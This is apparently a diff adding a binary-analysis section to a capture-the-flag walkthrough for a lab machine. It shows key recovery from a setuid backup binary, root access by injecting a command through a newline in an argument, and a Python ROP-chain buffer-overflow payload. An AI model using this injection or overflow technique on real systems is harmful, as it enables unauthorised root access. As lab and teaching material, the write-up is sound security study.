@@ -163,3 +163,75 @@ And the root user is pawned!
 
 References:
 1. https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell
+
+
+====================================
+Binary Analysis
+====================================
+└─# grep -Rin backup 
+var/www/myplace/app.js:12:const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';
+var/www/myplace/app.js:200:  app.get('/api/admin/backup', function (req, res) {
+var/www/myplace/app.js:202:      var proc = spawn('/usr/local/bin/backup', ['-q', backup_key, __dirname ]);
+
+root@kali:~# radare2 backup
+[0x08048780]> s main
+[0x080489fd]> pd 25
+
+└─# ltrace -s 128 ./backup key1 key2 hello
+
+strcat("/etc/myplace/key", "s")                                                             = "/etc/myplace/keys"
+fopen("/etc/myplace/keys", "r")                                                             = 0x9aed5b0
+fgets("a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508\n", 1000, 0x9aed5b0) = 0xffc3e8df
+strcspn("a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508\n", "\n")         = 64
+strcmp("key2", "a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508")          = 1
+fgets("45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474\n", 1000, 0x9aed5b0) = 0xffc3e8df
+strcspn("45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474\n", "\n")         = 64
+strcmp("key2", "45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474")          = 1
+fgets("3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110\n", 1000, 0x9aed5b0) = 0xffc3e8df
+strcspn("3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110\n", "\n")         = 64
+strcmp("key2", "3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110")          = 1
+fgets("3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110", 1000, 0x9aed5b0)  = 0
+strcpy(0xffc3d918, "Ah-ah-ah! You didn't say the magic word!\n\n")                          = 0xffc3d918
+
+tom@node:/etc/myplace$ cat keys
+cat keys
+a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508
+45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474
+3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110
+
+tom@node:/etc/myplace$ /usr/local/bin/backup a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $'\n node /dev/shm/shell.js'
+root@node:/etc/myplace# id
+id
+uid=0(root) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin)
+root@node:/etc/myplace# cat /root/root.txt
+cat /root/root.txt
+1722e99ca5f353b362556a62bd5e6be0
+
+==========
+└─# rabin2 -i backup to grab the plt address of system:
+13  0x080486a0 GLOBAL FUNC       system
+└─# objdump -s backup to view the text sections and find the GNU string:
+
+backup:     file format elf32-i386           
+Contents of section .note.ABI-tag:
+ 8048168 04000000 10000000 01000000 474e5500  ............GNU.
+ 8048178 00000000 02000000 06000000 20000000  ............ ...
+
+It’s at 0x8048174, so we now have all the information we need to construct our rop-chain:
+import struct
+
+def conv(x):
+    return struct.pack("<I", x)
+ 
+systemplt = conv(0x080486a0)
+exitplt = conv(0x080486c0)
+gnu_bin_abi = conv(0x8048174)
+ 
+rop = 'A' * 512
+rop += systemplt
+rop += exitplt
+rop += gnu_bin_abi
+ 
+print rop
+
+
